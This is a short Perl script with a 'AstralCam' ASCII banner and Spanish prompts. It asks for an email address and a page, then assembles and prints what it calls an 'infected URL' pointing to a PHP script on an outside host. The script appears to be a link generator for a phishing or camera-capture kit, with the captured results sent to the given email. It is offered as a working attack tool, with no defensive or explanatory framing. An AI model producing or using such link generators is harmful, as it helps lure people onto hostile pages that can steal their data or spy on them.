#!/usr/bin/perl

system('clear');

print "\n";
print "██████╗ ███████╗███████╗ ██████╗ █████╗ ██████╗  ██████╗ ██████╗ \n";
print "██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗██╔══██╗██╔═══██╗██╔══██╗\n";
print "██████╔╝█████╗  ███████╗██║     ███████║██║  ██║██║   ██║██████╔╝\n";
print "██╔═══╝ ██╔══╝  ╚════██║██║     ██╔══██║██║  ██║██║   ██║██╔══██╗\n";
print "██║     ███████╗███████║╚██████╗██║  ██║██████╔╝╚██████╔╝██║  ██║\n";
print "╚═╝     ╚══════╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n";
print "                            AstralCam\n\n";

print "introduce un correo\n> ";
$correo = <>;
print "\nintroduce una pagina\n> ";
$pagina = <>;

my $url = "http://inf-url.esy.es/php.php?correo=";
$url .= $correo;
$url .= "&pagina=";
$url .= $pagina ;
$url .=  "&OK=comezar";

print "\nsu url infectada:\n\n";
print $url;
print "\n\n";
